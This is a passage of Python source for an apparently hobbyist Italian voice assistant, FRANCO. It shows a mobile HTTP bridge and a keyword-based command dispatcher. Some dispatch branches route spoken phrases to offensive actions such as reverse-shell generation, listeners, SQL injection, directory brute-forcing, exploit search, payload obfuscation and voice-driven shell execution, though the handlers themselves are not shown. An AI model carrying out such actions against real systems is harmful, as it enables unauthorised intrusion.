                elif path == "/transcript":
                    self._serve_json(b._get_transcript())
                else:
                    self.send_error(404)

            def _route_post(self, b: "MobileBridge"):
                if not b._check_auth(self):
                    self.send_error(401, "Unauthorized")
                    return
                path = self.path.split("?")[0]
                if path == "/cmd":
                    length = int(self.headers.get("Content-Length", 0))
                    body = self.rfile.read(length)
                    try:
                        data = json.loads(body)
                    except Exception:
                        self.send_error(400, "Invalid JSON")
                        return
                    cmd = str(data.get("command", "")).strip()
                    if cmd:
                        b.cmd_q.put(cmd)
                        b.transcript.append(("USER", cmd, datetime.now()))
                        self._serve_json({"ok": True, "command": cmd})
                    else:
                        self._serve_json({"ok": False, "error": "empty command"})
                else:
                    self.send_error(404)

            def _serve_html(self, html: str):
                data = html.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", len(data))
                self._cors()
                self.end_headers()
                self.wfile.write(data)

            def _serve_json(self, obj):
                data = json.dumps(obj, ensure_ascii=False, default=str).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/json; charset=utf-8")
                self.send_header("Content-Length", len(data))
                self._cors()
                self.end_headers()
                self.wfile.write(data)

            def _serve_sse(self, b: "MobileBridge"):
                self.send_response(200)
                self.send_header("Content-Type", "text/event-stream")
                self.send_header("Cache-Control", "no-cache")
                self.send_header("X-Accel-Buffering", "no")
                self._cors()
                self.end_headers()

                q: queue.Queue = queue.Queue(maxsize=50)
                with b._sse_lock:
                    b._sse_clients.append(q)

                # Send initial transcript
                try:
                    self._sse_write("transcript", json.dumps(b._get_transcript()["messages"]))
                except Exception as _e:
                    pass  # suppressed error

                try:
                    while b._running:
                        try:
                            event_type, data = q.get(timeout=25)
                            self._sse_write(event_type, data)
                        except queue.Empty:
                            # Heartbeat
                            self.wfile.write(b": heartbeat\n\n")
                            self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError, Exception):
                    pass
                finally:
                    with b._sse_lock:
                        try:
                            b._sse_clients.remove(q)
                        except ValueError:
                            pass

            def _sse_write(self, event: str, data: str):
                msg = ("event: " + event + "\ndata: " + data + "\n\n").encode("utf-8")
                self.wfile.write(msg)
                self.wfile.flush()

            def _serve_qr(self, b: "MobileBridge"):
                ip = get_local_ip()
                key = next(iter(b._api_keys), "")
                url = f"http://{ip}:{b._port}/?key={key}"
                if qrcode:
                    img = qrcode.make(url)
                    buf = io.BytesIO()
                    img.save(buf, format="PNG")
                    data = buf.getvalue()
                    self.send_response(200)
                    self.send_header("Content-Type", "image/png")
                    self.send_header("Content-Length", len(data))
                    self._cors()
                    self.end_headers()
                    self.wfile.write(data)
                else:
                    self._serve_json({"url": url})

        try:
            # ThreadingHTTPServer: la connessione SSE su /events resta aperta
            # a lungo (heartbeat ogni 25s) — con HTTPServer semplice (un
            # thread, una richiesta alla volta) quella singola connessione
            # bloccherebbe TUTTE le altre richieste (incluse /, /status,
            # /cmd) finche' il client SSE non si disconnette.
            self._server = ThreadingHTTPServer((self._host, self._port), Handler)
            self._server.daemon_threads = True
            self._server.serve_forever()
        except Exception as e:
            self.logger.error("MOBILE", f"Server error: {e}")
            self._running = False

    # ------------------------------------------------------------------ #
    #  DATA PROVIDERS
    # ------------------------------------------------------------------ #

    def _get_status(self) -> Dict[str, Any]:
        sys_state = self.state.get("system_state", SystemState.IDLE)
        return {
            "state":   sys_state.name if hasattr(sys_state, "name") else str(sys_state),
            "cpu":     self.state.get("cpu_percent", 0),
            "ram":     self.state.get("ram_percent", 0),
            "disk":    self.state.get("disk_percent", 0),
            "battery": self.state.get("battery_percent", -1),
            "plugged": self.state.get("battery_plugged", True),
            "listening": self.state.get("listening", False),
            "speaking":  self.state.get("speaking", False),
            "thinking":  self.state.get("thinking", False),
            "uptime":  self.state.get("uptime_seconds", 0),
            "ts":      datetime.now().isoformat(),
        }

    def _get_transcript(self, n: int = 40) -> Dict[str, Any]:
        msgs = []
        for entry in list(self.transcript)[-n:]:
            if isinstance(entry, tuple) and len(entry) >= 2:
                role = str(entry[0])
                text = str(entry[1])
                ts   = entry[2].strftime("%H:%M") if len(entry) > 2 and hasattr(entry[2], "strftime") else ""
                msgs.append({"role": role, "text": text, "ts": ts})
        return {"messages": msgs}

    # ------------------------------------------------------------------ #
    #  SSE PUSH
    # ------------------------------------------------------------------ #

    def _push_sse(self, event_type: str, data: dict):
        payload = json.dumps(data, ensure_ascii=False, default=str)
        dead = []
        with self._sse_lock:
            for q in self._sse_clients:
                try:
                    q.put_nowait((event_type, payload))
                except queue.Full:
                    dead.append(q)
            for q in dead:
                self._sse_clients.remove(q)

    def _state_pusher(self):
        """Push stato sistema ogni 5 secondi a tutti i client SSE."""
        while self._running:
            time.sleep(5)
            try:
                self._push_sse("status", self._get_status())
            except Exception as _e:
                pass  # suppressed error

    def _on_command_processed(self, event):
        """Quando FRANCO risponde, push il messaggio ai client mobile."""
        if not hasattr(event, "data") or not event.data:
            return
        response = event.data.get("response", "")
        if not response:
            return
        ts = datetime.now().strftime("%H:%M")
        self._push_sse("message", {"text": response, "ts": ts, "role": "FRANCO"})

    def _on_proactive_alert(self, event):
        """Push notifiche proattive anche a mobile."""
        if not hasattr(event, "data") or not event.data:
            return
        msg = event.data.get("message", "")
        lvl = event.data.get("level", "info")
        if msg:
            ts = datetime.now().strftime("%H:%M")
            tag = lvl.upper() if lvl != "info" else "ALERT"
            self._push_sse("message", {"text": f"[{tag}] {msg}", "ts": ts, "role": "FRANCO"})

    # ------------------------------------------------------------------ #
    #  NTFY PUSH (backup quando FRANCO parla)
    # ------------------------------------------------------------------ #

    def push_speech(self, text: str):
        """Chiamato ogni volta che FRANCO parla — push ntfy opzionale."""
        if not text or len(text) < 10:
            return
        try:
            self.notifier.send("FRANCO", text, priority="default", tags=["robot"])
        except Exception as _e:
            pass  # suppressed error

        # Push SSE anche a client connessi (ridondante ma utile se SSE è già aperto)
        ts = datetime.now().strftime("%H:%M")
        self._push_sse("message", {"text": text, "ts": ts, "role": "FRANCO"})

    def get_url(self) -> str:
        return f"http://{get_local_ip()}:{self._port}"


# ==============================================================================
# COMMAND ENGINE — Dispatcher centrale comandi
# ==============================================================================

class CommandEngine:
    """
    Dispatcher centrale per tutti i comandi vocali/testuali.
    Routing intelligente verso i moduli appropriati.
    """

    def __init__(self,
                 logger: StructuredLogger,
                 state: StateManager,
                 memory: MemoryManager,
                 db: DatabaseManager,
                 cache: CacheManager,
                 config: ConfigurationManager,
                 event_bus: EventBus,
                 ai_client: ClaudeAIClient,
                 voice_synth: VoiceSynthesizer,
                 screen_vision: ScreenVision,
                 security: SecurityCoordinator,
                 nlp: NLPEngine,
                 backup_mgr: BackupManager,
                 vault: CryptoVault,
                 email_cfg: EmailConfigManager,
                 app_launcher: Optional['AppLauncher'] = None):

        self.logger = logger
        self.state = state
        self.memory = memory
        self.db = db
        self.cache = cache
        self.config = config
        self.event_bus = event_bus
        self.ai = ai_client
        self.tts = voice_synth
        self.vision = screen_vision
        self.security = security
        self.nlp = nlp
        self.backup_mgr = backup_mgr
        self.vault = vault
        self.email_cfg = email_cfg
        self.app_launcher = app_launcher
        self.memory_guard = None

        # Timer/scheduler threads attivi
        self._active_timers: Dict[str, threading.Timer] = {}
        self._macro_macros: Dict[str, List[str]] = self.memory.get("macros", {})

        # Lock per operazioni critiche
        self._lock = threading.Lock()

        # Loop "gioca al posto mio" — thread + evento di stop
        self._game_thread: Optional[threading.Thread] = None
        self._game_stop_event: Optional[threading.Event] = None
        self._game_name: Optional[str] = None

        # Controllo remoto dispositivi (lazy: costruito al primo comando)
        self._rdc: Optional["RemoteDeviceController"] = None

    # ------------------------------------------------------------------
    # CONTROLLO REMOTO DISPOSITIVI (voce)
    # ------------------------------------------------------------------

    def _remote_devices(self) -> "RemoteDeviceController":
        """Costruisce/ritorna il controller dispositivi. L'HA bridge viene
        letto a runtime da self.home_assistant (attaccato da FrancoCore)."""
        if self._rdc is None:
            self._rdc = RemoteDeviceController(
                logger=self.logger,
                db=self.db,
                config=self.config,
                event_bus=self.event_bus,
                ha_provider=lambda: getattr(self, "home_assistant", None),
            )
        return self._rdc

    def _rdc_should_handle(self, t: str) -> bool:
        try:
            return self._remote_devices().should_handle(t)
        except Exception:
            return False

    def _cmd_remote_device(self, raw: str) -> str:
        try:
            return self._remote_devices().handle(raw)
        except Exception as e:
            self.logger.error("DEVICE", f"comando dispositivo fallito: {e}")
            return "Non sono riuscito a controllare il dispositivo."

    def _attack_lab(self) -> "AttackLab":
        al = getattr(self, "_al", None)
        if al is None:
            al = AttackLab(logger=self.logger, config=self.config, event_bus=self.event_bus)
            self._al = al
        return al

    def _al_should_handle(self, t: str) -> bool:
        try:
            return self._attack_lab().should_handle(t)
        except Exception:
            return False

    def _cmd_attack_lab(self, raw: str) -> str:
        try:
            return self._attack_lab().handle(raw)
        except Exception as e:
            self.logger.error("ATTACK", f"comando offensivo fallito: {e}")
            return "Attack Lab: errore nell'esecuzione."

    # ------------------------------------------------------------------
    # ENTRY POINT PRINCIPALE
    # ------------------------------------------------------------------

    def process(self, raw_input: str) -> str:
        """
        Processa un comando e restituisce la risposta testuale.
        Effettua anche side-effects (apre app, scatta screenshot, ecc.)
        """
        start = time.perf_counter()
        raw = raw_input.strip()
        if not raw:
            return ""

        # Messaggio speciale wake-up
        if raw == "__WAKE__":
            user_name = self.memory.get_user_name()
            return f"Sì, {user_name}. Sono in ascolto."

        # === Analisi NLP (non blocca, arricchisce il contesto) ===
        _nlp_result = None
        _nlp = getattr(self, "nlp", None)
        if _nlp:
            try:
                _nlp_result = _nlp.process(raw)
                # Salva sentiment/intent nello stato per l'UI
                if _nlp_result:
                    self.state.set("last_sentiment", _nlp_result["sentiment"]["label"])
                    self.state.set("last_intent",    _nlp_result["top_intent"])
            except Exception as _e:
                pass  # suppressed error
        # === Fine NLP ===

        # Risposte istantanee Jarvis (nessuna AI necessaria)
        _JARVIS_QUICK = {
            ("come stai", "come va", "stai bene", "come sei"): lambda: (
                f"Operativo al 100%, {self.memory.get_user_name()}. "
                f"CPU {self.state.get('cpu_percent',0):.0f}%, "
                f"RAM {self.state.get('ram_percent',0):.0f}%. Pronto ai suoi ordini."
            ),
            ("ciao franco", "salve franco", "ciao jarvis", "hey franco", "hey jarvis",
             "buongiorno franco", "buonasera franco", "buonanotte franco"): lambda: (
                f"Salve, {self.memory.get_user_name()}. Come posso aiutarla?"
            ),
            ("grazie", "perfetto", "ottimo", "bravo", "bene", "fantastico",
             "eccellente", "capito", "ok franco", "capisco", "va bene"): lambda: (
                f"Prego, {self.memory.get_user_name()}."
            ),
            ("chi sei", "presentati", "che sei", "descriviti"): lambda: (
                "Sono F.R.A.N.C.O., Full Responsive Autonomous Neural Control Operator, "
                "versione 6.0 NEXUS. Il suo assistente personale Jarvis-style. "
                "Posso gestire il suo PC, monitorare i mercati, scrivere codice, "
                "proteggere il sistema e molto altro."
            ),
            ("quanti moduli hai", "moduli attivi", "stato franco",
             "cosa puoi fare", "che capacità hai", "funzionalità"): lambda: self._cmd_status_summary(),
            ("dove sei", "sei attivo", "sei sveglio", "mi senti"): lambda: (
                f"Attivo e operativo, {self.memory.get_user_name()}. "
                f"Elaborazione comandi in tempo reale. Posso aiutarla."
            ),
            ("buonanotte", "a dopo", "arrivederci", "ci vediamo", "esco"): lambda: (
                f"Arrivederci, {self.memory.get_user_name()}. "
                f"Resto in modalità standby. Buona giornata."
            ),
            ("fermati auto miglioramento", "ferma auto miglioramento",
             "basta migliorarti", "smetti di migliorarti",
             "ferma il self improve", "franco fermati di scrivere codice"):
                lambda: self._cmd_stop_self_improve(),
            ("usa il cervello cloud", "usa il cervello openrouter", "usa openrouter",
             "passa al cloud", "usa la ai cloud", "torna al cloud"):
                lambda: self._cmd_switch_brain("openrouter"),
            ("usa il cervello locale", "usa il cervello offline", "usa llama",
             "usa il modello locale come predefinito", "passa al locale",
             "usa la ai locale"):
                lambda: self._cmd_switch_brain("local"),
            ("usa claude", "usa il cervello claude", "passa a claude"):
                lambda: self._cmd_switch_brain("claude"),
        }
        _t_lower = raw.lower().strip()
        for keywords, fn in _JARVIS_QUICK.items():
            if any(_t_lower == k or _t_lower.startswith(k) for k in keywords):
                return fn()

        # Miglioramento mirato a richiesta: "Franco, voglio migliorare X",
        # "migliora su X", "impara a fare X" -> genera codice per QUELLO
        # specifico invece di un'idea a caso (vedi franco_self_improve.py
        # --request, stessa rete di sicurezza del loop autonomo).
        _improve_match = re.search(
            r"(?:voglio migliorare|vorrei migliorare|migliora(?:ti)?\s+(?:franco\s+)?su|"
            r"impara a fare|impara a)\s+(.+)",
            _t_lower,
        )
        if _improve_match:
            return self._cmd_targeted_self_improve(_improve_match.group(1))

        t = raw.lower()

        # Aggiorna statistiche
        self.state.increment("commands_executed")
        self.memory.increment_stat("comandi_totali")
        self.state.set("last_command_time", time.time(), notify=False)

        # --------------- ROUTING PER CATEGORIA ---------------

        response = None

        # 1. Comandi sistema immediati
        if any(k in t for k in ["che ore", "che ora", "ora è", "dimmi l'ora"]):
            response = self._cmd_time()

        elif any(k in t for k in ["analizza canale youtube", "report youtube", "analisi youtube"]):
           response = self._cmd_youtube_analysis()  

        elif any(k in t for k in ["che giorno", "che data", "data di oggi", "quanti siamo"]):
            response = self._cmd_date()

        elif any(k in t for k in ["spegni il pc", "spegni computer", "shutdown"]):
            response = self._cmd_shutdown()

        elif any(k in t for k in ["riavvia il pc", "riavvia computer", "reboot", "restart pc"]):
            response = self._cmd_restart()

        elif any(k in t for k in ["blocca schermo", "blocca pc", "lock screen"]):
            response = self._cmd_lock_screen()

        elif any(k in t for k in ["standby", "stai zitto", "silenzio", "dormi", "vai in pausa"]):
            response = self._cmd_standby()

        elif any(k in t for k in ["svegliati", "riattivati", "attivati"]):
            response = self._cmd_wake()

        elif any(k in t for k in ["aiuto", "cosa sai fare", "comandi disponibili", "help"]):
            response = self._cmd_help()

        # 1b. CONTROLLO REMOTO DISPOSITIVI (voce) — luci, telefoni, smart home
        elif self._rdc_should_handle(t):
            response = self._cmd_remote_device(raw)

        # 1c. ATTACK LAB (voce) — recon web, payload, JWT, CVE intel
        elif self._al_should_handle(t):
            response = self._cmd_attack_lab(raw)

        # 2. Applicazioni
        elif t.startswith(("apri ", "lancia ", "avvia ", "esegui ", "apri il ", "lancia il ")):
            app_name = self._extract_after(t, ["apri il ", "lancia il ", "avvia il ", "apri ", "lancia ", "avvia ", "esegui "])
            response = self._cmd_open_app(app_name)

        elif t.startswith(("chiudi ", "termina ", "killa ")):
            app_name = self._extract_after(t, ["chiudi ", "termina ", "killa "])
            if any(k in t for k in ("processi inutili", "processo inutile")):
                response = (self.memory_guard.propose_cleanup() if self.memory_guard
                            else "Gestore memoria non disponibile.")
            else:
                for prefix in ("processo ", "il processo ", "l'app ", "app "):
                    if app_name.startswith(prefix):
                        app_name = app_name[len(prefix):].strip()
                        break
                response = self._cmd_close_app(app_name)

        elif ("notizie" not in t) and (
            t.startswith(("scarica e installa ", "scarica l'app ", "scarica app ",
                           "installa l'app ", "installa app ", "scarica ", "installa "))
        ):
            app_name = self._extract_after(t, [
                "scarica e installa ", "scarica l'app ", "scarica app ",
                "installa l'app ", "installa app ", "scarica ", "installa "
            ])
            response = self._cmd_download_app(app_name)

        # 3. Web
        elif any(k in t for k in ["cerca su google", "cerca online", "googla"]):
            query = self._extract_after(t, ["cerca su google ", "cerca online ", "googla "])
            response = self._cmd_search_web(query)

        elif any(k in t for k in ["apri sito", "vai su", "apri url", "naviga su"]):
            url = self._extract_after(t, ["apri sito ", "vai su ", "apri url ", "naviga su "])
            response = self._cmd_open_url(url)

        elif any(k in t for k in ["cerca su youtube", "youtube"]):
            query = self._extract_after(t, ["cerca su youtube ", "youtube "])
            response = self._cmd_youtube(query)

        # 3b. Scrittura ovunque (su Google o campo attivo) + controllo mouse
        elif any(k in t for k in ["scrivi su google", "digita su google", "scrivi ovunque su google"]):
            query = self._extract_after(raw, ["scrivi su google ", "digita su google ", "scrivi ovunque su google "])
            response = self._cmd_write_on_google(query)

        elif t.startswith(("scrivi ovunque ", "digita ovunque ", "scrivi qui ", "digita qui ",
                            "scrivi sullo schermo ", "scrivi nel campo ")):
            text_to_type = self._extract_after(raw, ["scrivi ovunque ", "digita ovunque ", "scrivi qui ",
                                                       "digita qui ", "scrivi sullo schermo ", "scrivi nel campo "])
            response = self._cmd_type_text(text_to_type)

        elif any(k in t for k in ["muovi il mouse", "sposta il mouse", "muovi mouse", "sposta mouse"]):
            response = self._cmd_mouse_move(raw)

        elif any(k in t for k in ["trascina da", "trascina il mouse"]):
            response = self._cmd_mouse_drag(raw)

        elif any(k in t for k in ["doppio click", "doppio clic"]):
            response = self._cmd_mouse_click(raw, button="left", clicks=2)

        elif any(k in t for k in ["click destro", "clic destro", "tasto destro"]):
            response = self._cmd_mouse_click(raw, button="right")

        elif any(k in t for k in ["clicca", "fai click", "fai clic", "clic sinistro", "click sinistro"]):
            response = self._cmd_mouse_click(raw, button="left")

        elif any(k in t for k in ["scorri su", "scorri giù", "scorri giu", "scorri in basso", "scorri in alto",
                                    "scrolla su", "scrolla giù", "scrolla giu"]):
            response = self._cmd_mouse_scroll(raw)

        # 4. Volume
        elif any(k in t for k in ["alza il volume", "aumenta il volume", "volume su", "più volume"]):
            amount = self._extract_number(t, default=10)
            response = self._cmd_volume_up(amount)

        elif any(k in t for k in ["abbassa il volume", "diminuisci il volume", "volume giù", "meno volume"]):
            amount = self._extract_number(t, default=10)
            response = self._cmd_volume_down(amount)

        elif "muto" in t or "silenzia l'audio" in t:
            response = self._cmd_mute()

        # 5. Timer / promemoria
        elif any(k in t for k in ["timer", "avvisami tra", "ricordami tra", "conto alla rovescia"]):
            response = self._cmd_timer(raw)

        elif any(k in t for k in ["aggiungi promemoria", "promemoria", "ricordami di"]):
            content = self._extract_after(t, ["aggiungi promemoria ", "promemoria: ", "ricordami di "])
            response = self._cmd_add_reminder(content)

        elif "promemoria attivi" in t or "prossimi promemoria" in t:
            response = self._cmd_list_reminders()

        # 6. Note
        elif t.startswith(("nota:", "scrivi nota", "aggiungi nota", "salva nota")):
            content = self._extract_after(t, ["nota: ", "scrivi nota ", "aggiungi nota ", "salva nota "])
            response = self._cmd_add_note(content)

        elif any(k in t for k in ["mostra note", "leggi note", "mie note"]):
            response = self._cmd_show_notes()

        # 7. File system
        elif any(k in t for k in ["crea file", "crea cartella", "crea directory"]):
            response = self._cmd_create_file_or_dir(raw)

        elif any(k in t for k in ["cerca file", "trova file"]):
            filename = self._extract_after(t, ["cerca file ", "trova file "])
            response = self._cmd_search_file(filename)

        elif "apri esplora risorse" in t or "apri explorer" in t:
            path_arg = self._extract_after(t, ["apri esplora risorse ", "apri explorer "]) or "."
            response = self._cmd_open_explorer(path_arg)

        elif any(k in t for k in ["backup dati", "esegui backup", "crea backup"]):
            response = self._cmd_backup()

        # 8. Screenshot / visione
        elif any(k in t for k in ["screenshot", "cattura schermata", "schermata"]):
            response = self._cmd_screenshot()

        elif any(k in t for k in ["cosa vedi", "analizza schermo", "guarda lo schermo", "descrivi lo schermo"]):
            question = self._extract_after(t, ["cosa vedi ", "analizza schermo "]) or None
            response = self._cmd_analyze_screen(question)

        # 9. Codice / AI
        elif any(k in t for k in ["scrivi codice", "genera codice", "crea script", "programma"]):
            desc = self._extract_after(t, ["scrivi codice ", "genera codice ", "crea script ", "programma "])
            lang_match = re.search(r"\bin\s+(python|javascript|java|c\+\+|bash|sql|html|css)\b", t)
            lang = lang_match.group(1) if lang_match else "python"
            response = self._cmd_generate_code(desc, lang)

        elif any(k in t for k in ["riassumi", "sintetizza"]):
            text_to_sum = self._extract_after(t, ["riassumi ", "sintetizza "])
            response = self._cmd_summarize(text_to_sum)

        elif "traduci" in t:
            lang_match = re.search(r"in\s+(inglese|francese|spagnolo|tedesco|portoghese|cinese|giapponese)", t)
            target = lang_match.group(1) if lang_match else "inglese"
            text_to_tr = self._extract_after(t, ["traduci in " + target + " ", "traduci "])
            response = self._cmd_translate(text_to_tr, target)

        # 10. Cybersecurity
        elif any(k in t for k in ["scansiona porte", "port scan", "scan porte", "scansione porte"]):
            target = self._extract_target(t)
            response = self._cmd_port_scan(target or "localhost")

        elif any(k in t for k in ["deep scan", "scansione vulnerabilità", "vulnerability scan"]):
            target = self._extract_target(t)
            response = self._cmd_vuln_scan(target or "localhost")

        elif any(k in t for k in ["controlla password", "verifica password", "analizza password"]):
            pwd = self._extract_after(t, ["controlla password ", "verifica password ", "analizza password "])
            response = self._cmd_check_password(pwd)

        elif any(k in t for k in ["identifica hash", "che tipo di hash", "analizza hash"]):
            hash_val = self._extract_after(t, ["identifica hash ", "che tipo di hash ", "analizza hash "])
            response = self._cmd_identify_hash(hash_val)

        elif any(k in t for k in ["controlla ssl", "analizza ssl", "certificato ssl"]):
            target = self._extract_target(t) or self._extract_after(t, ["controlla ssl ", "analizza ssl ", "certificato ssl di "])
            response = self._cmd_check_ssl(target)

        elif any(k in t for k in ["dns lookup", "risolvi dns", "cerca dns"]):
            domain = self._extract_after(t, ["dns lookup ", "risolvi dns ", "cerca dns "])
            response = self._cmd_dns_lookup(domain)

        elif any(k in t for k in ["geolocalizza ip", "localizza ip", "dove si trova l'ip", "info ip"]):
            ip = self._extract_after(t, ["geolocalizza ip ", "localizza ip ", "dove si trova l'ip ", "info ip "])
            response = self._cmd_ip_intel(ip)

        elif any(k in t for k in ["genera password", "crea password sicura", "nuova password"]):
            length_match = re.search(r"(\d+)\s*(caratteri|char)", t)
            length = int(length_match.group(1)) if length_match else 16
            response = self._cmd_generate_password(length)

        elif "rapporto sicurezza" in t or "security report" in t:
            response = self._cmd_security_report()

        elif "postura sicurezza" in t or "stato sicurezza" in t:
            response = self._cmd_security_posture()

        # 10b. Offensive / Red Team
        elif any(k in t for k in ["reverse shell", "shell inversa", "genera shell"]):
            response = self._cmd_reverse_shell(raw)

        elif any(k in t for k in ["avvia listener", "start listener", "metti in ascolto", "cattura shell"]):
            response = self._cmd_start_listener(raw)

        elif any(k in t for k in ["sweep", "scan aggressivo", "scansione aggressiva", "full port scan"]):
            response = self._cmd_offensive_sweep(self._extract_target(t))

        elif any(k in t for k in ["web fuzz", "directory brute", "dir brute", "brute directory", "fuzz web"]):
            target = self._extract_after(t, ["web fuzz ", "fuzz web ", "directory brute ", "dir brute ", "brute directory "])
            response = self._cmd_web_fuzz(target or self._extract_target(t))

        elif "sqli" in t or "sql injection" in t or "inietta sql" in t:
            response = self._cmd_sqli(raw)

        elif any(k in t for k in ["scopri host", "host lan", "arp scan", "scansiona rete", "discovery lan"]):
            response = self._cmd_lan_discovery(raw)

        elif any(k in t for k in ["cerca exploit", "trova exploit", "search exploit", "exploit per"]):
            q = self._extract_after(t, ["cerca exploit ", "trova exploit ", "search exploit ", "exploit per "])
            response = self._cmd_search_exploit(q)

        elif any(k in t for k in ["codifica payload", "encode payload", "offusca payload", "codifica base64"]):
            response = self._cmd_encode_payload(raw)

        # 11. Vault
        elif any(k in t for k in ["salva password", "memorizza credenziali", "aggiungi credenziale"]):
            response = self._cmd_vault_save(raw)

        elif any(k in t for k in ["dammi la password", "credenziali di", "mostra password"]):
            service = self._extract_after(t, ["dammi la password di ", "credenziali di ", "mostra password di ", "password per "])
            response = self._cmd_vault_get(service)

        elif "lista servizi vault" in t or "servizi salvati" in t:
            response = self._cmd_vault_list()

        # 12. Email
        elif any(k in t for k in ["manda email", "invia email", "scrivi email", "manda una mail"]):
            response = self._cmd_send_email(raw)

        elif any(k in t for k in ["configura email", "imposta email"]):
            response = self._cmd_configure_email(raw)

        # 13. Sistema info
        elif any(k in t for k in ["stato memoria", "memoria disponibile", "quanta ram"]):
            response = (self.memory_guard.status_text() if self.memory_guard
                        else self._cmd_system_info())

        elif any(k in t for k in ["stato sistema", "info sistema", "cpu ram", "utilizzo cpu"]):
            response = self._cmd_system_info()

        elif any(k in t for k in ["chiudi i processi inutili", "chiudi processi inutili",
                                   "libera ram", "ottimizza la ram"]):
            response = (self.memory_guard.propose_cleanup() if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif any(k in t for k in ["mostra processi", "processi attivi", "lista processi", "top processi"]):
            response = (self.memory_guard.format_candidates() if self.memory_guard
                        else self._cmd_list_processes())

        elif t.startswith("conferma chiudi "):
            proc_name = raw[len("conferma chiudi "):].strip()
            response = (self.memory_guard.confirm_close(proc_name) if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif t.startswith("proteggi app "):
            response = (self.memory_guard.protect(raw[len("proteggi app "):].strip()) if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif t.startswith("non suggerire più ") or t.startswith("non suggerire piu "):
            marker = "non suggerire più " if t.startswith("non suggerire più ") else "non suggerire piu "
            response = (self.memory_guard.never_suggest(raw[len(marker):].strip()) if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif any(k in t for k in ["lista app protette", "mostra app protette"]):
            response = (self.memory_guard.protected_list() if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif any(k in t for k in ["ottimizza franco", "libera memoria di franco"]):
            response = (self.memory_guard.optimize_franco() if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif any(k in t for k in ["report memoria", "rapporto memoria"]):
            response = (self.memory_guard.report() if self.memory_guard
                        else "Gestore memoria non disponibile.")

        elif any(k in t for k in ["termina processo", "kill processo", "chiudi processo"]):
            proc_name = self._extract_after(t, ["termina processo ", "kill processo ", "chiudi processo "])
            response = self._cmd_kill_process(proc_name)

        elif any(k in t for k in ["connessioni di rete", "connessioni attive", "ip locale", "ip pubblico"]):
            response = self._cmd_network_info()

        # 14. Macro
        elif t.startswith("registra macro"):
            name = self._extract_after(t, ["registra macro "])
            response = self._cmd_start_macro(name)

        elif t.startswith("stop macro") or t == "termina registrazione":
            response = self._cmd_stop_macro()

        elif t.startswith("esegui macro"):
            name = self._extract_after(t, ["esegui macro "])
            response = self._cmd_run_macro(name)

        elif "lista macro" in t or "macro disponibili" in t:
            response = self._cmd_list_macros()

        # 15. Voce / tema
        elif t.startswith("cambia voce"):
            voice = self._extract_after(t, ["cambia voce in ", "cambia voce "])
            response = self.tts.change_voice(voice)

        elif t.startswith("cambia tema"):
            theme = self._extract_after(t, ["cambia tema ", "tema "])
            response = self._cmd_change_theme(theme)

        elif any(k in t for k in ["come ti chiami", "chi sei", "presentati"]):
            response = self._cmd_identity()

        elif any(k in t for k in ["storico comandi", "ultimi comandi"]):
            response = self._cmd_command_history()

        elif any(k in t for k in ["svuota cache", "pulisci cache"]):
            response = self._cmd_clear_cache()

        # 16. Disk cleanup — Jarvis-style
        elif any(k in t for k in [
            "libera spazio", "pulisci disco", "libera disco", "spazio disco",
            "quant", "spazio libero", "analizza disco", "file grandi",
            "svuota cestino", "pulisci temp", "pulisci file temporanei",
        ]):
            response = self._cmd_disk_manager(t, raw)

        # 17. Home Assistant
        elif any(k in t for k in [
            "accendi luce", "spegni luce", "luci on", "luci off",
            "accendi", "spegni", "temperatura casa", "stato casa",
            "alza temperatura", "abbassa temperatura", "scene", "script casa",
            "smart home", "home assistant",
        ]):
            response = self._cmd_home_assistant(t, raw)

        # 17a. Identità utente — impara il nome
        elif any(k in t for k in ["mi chiamo", "chiamami", "il mio nome è", "sono "]):
            name_match = re.search(
                r"(?:mi chiamo|chiamami|il mio nome è|sono)\s+([A-Za-zÀ-ÿ]{2,30})", t
            )
            if name_match:
                name = name_match.group(1).capitalize()
                self.memory.set_user_name(name)
                response = f"Piacere, {name}. Ricorderò il suo nome."
            else:
                response = self._cmd_ai_fallback(raw)

        # 17b. Meteo
        elif any(k in t for k in ["meteo", "che tempo fa", "piove", "temperatura fuori",
                                   "previsioni", "weather"]):
            city = self._extract_after(t, ["meteo a ", "meteo di ", "che tempo fa a ",
                                            "previsioni per ", "weather "]) or "Milano"
            response = self._cmd_weather(city)

        # 18. Briefing proattivo manuale
        elif any(k in t for k in ["briefing", "report mattutino", "riassumi la giornata",
                                   "cosa ho oggi", "aggiornami"]):
            response = self._cmd_daily_brief()

        # 19. Esecuzione comandi CMD / PowerShell
        elif any(k in t for k in [
            "esegui nel cmd", "esegui nel terminale", "esegui comando",
            "lancia nel cmd", "lancia nel terminale", "comando cmd",
            "comando terminale", "nel cmd ", "nel terminale ", "cmd:", "shell:",
            "apri terminale ed esegui", "esegui su cmd",
        ]):
            cmd_str = self._extract_shell_command(raw)
            response = self._cmd_shell(cmd_str) if cmd_str else "Nessun comando specificato."

        # 20. Trading — comandi voce completi
        elif any(k in t for k in [
            "quanto vale", "prezzo di", "prezzo ",
            "compra ", "acquista ", "vendi ", "compra azioni",
            "portafoglio", "portfolio", "saldo", "liquidità",
            "guadagnato oggi", "perso oggi", "rendimento",
            "analizza il titolo", "analizza azione",
            "top titoli", "migliori azioni", "peggiori azioni",
            "avvia rotazione", "ferma rotazione", "stato rotazione",
            "avvia autotrader", "ferma autotrader", "stato autotrader",
            "avvia stream", "ferma stream", "stato stream",
            "confronta strategie", "backtest",
            "watchlist", "aggiungi alla watchlist", "rimuovi dalla watchlist",
        ]):
            response = self._cmd_trading_voice(t, raw)

        # 21. Delegazione a FRANCO CODE (task autonomi multi-step)
        elif any(k in t for k in [
            "fai in autonomia", "fallo autonomamente", "esegui autonomamente",
            "apri e fai", "naviga e", "scrivi nel codice",
            "analizza il codice", "crea un programma", "fai un programma",
            "apri chrome e", "cerca nel web e", "scarica ",
            "automatizza ", "crea un agente",
        ]):
            response = self._cmd_delegate_to_code_agent(raw)

        # 21c. Progetto attivo — descrizione dettagliata per aiuto contestuale
        elif t.startswith(("il mio progetto è ", "il mio progetto si chiama ",
                            "sto lavorando su ", "il progetto riguarda ")):
            project_desc = raw
            # Salva nel Second Brain + brainstorma
            try:
